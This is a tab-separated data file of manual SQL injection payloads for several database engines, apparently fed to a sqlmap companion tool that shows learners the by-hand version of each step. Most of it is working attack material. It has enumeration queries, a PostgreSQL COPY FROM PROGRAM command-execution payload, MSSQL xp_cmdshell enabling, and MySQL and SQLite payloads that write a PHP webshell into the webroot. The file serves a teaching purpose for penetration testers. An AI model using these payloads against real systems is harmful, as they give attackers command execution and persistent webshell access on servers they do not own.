column1: # Per-DBMS manual-SQLi building blocks, used by the sqlmap detector to show the by-hand
# equivalent of each sqlmap step (so you learn manual SQLi instead of only leaning on the tool).
# The detector wraps the read expressions into a UNION payload using the column count and the
# visible ("string") column that sqlmap already found, and prints the stacked-query techniques
# for RCE as-is. Placeholders <DB> <TABLE> <COL1> <COL2> are yours to fill from the earlier steps.
# Match is on the DBMS name sqlmap prints ("back-end DBMS: ..."). Columns are TAB separated.

column10: stacked query (superuser): ';CREATE TABLE IF NOT EXISTS sd(o text);COPY sd FROM PROGRAM 'id';-- -  then read it back with UNION: (SELECT string_agg(o,chr(10)) FROM sd) . This is COPY ... FROM PROGRAM (CVE-2019-9193) - exactly what sqlmap --os-shell does here.

UNION write a webshell (needs FILE priv + writable webroot + empty secure_file_priv): ' UNION SELECT '<?php system($_GET[0]);?>',NULL,... INTO OUTFILE '/var/www/html/sd.php'-- -  then hit /sd.php?0=id

stacked query (sysadmin): ';EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami';-- -  which is what sqlmap --os-shell automates.

column5: (SELECT listagg(username,',') WITHIN GROUP (ORDER BY username) FROM all_users)
column6: (SELECT listagg(table_name,',') WITHIN GROUP (ORDER BY table_name) FROM all_tables WHERE owner='<DB>')
column7: (SELECT listagg(column_name,',') WITHIN GROUP (ORDER BY column_name) FROM all_tab_columns WHERE table_name='<TABLE>')
column9: use sqlmap --file-read; by hand needs a DIRECTORY object + UTL_FILE (advanced)
column10: Oracle RCE is advanced (DBMS_SCHEDULER / Java / PL/SQL); use sqlmap --os-shell and read up on Oracle-specific techniques. Note: Oracle scalar SELECTs need FROM dual and UNION columns must type-match.

column5: SQLite has a single database (the file itself) - no database list to enumerate.
column9: SQLite cannot read arbitrary files through SQL in the normal case.
column10: if the webroot is writable: ATTACH DATABASE '/var/www/html/sd.php' AS a; CREATE TABLE a.p(c text); INSERT INTO a.p VALUES ('<?php system($_GET[0]);?>'); then hit /sd.php?0=id
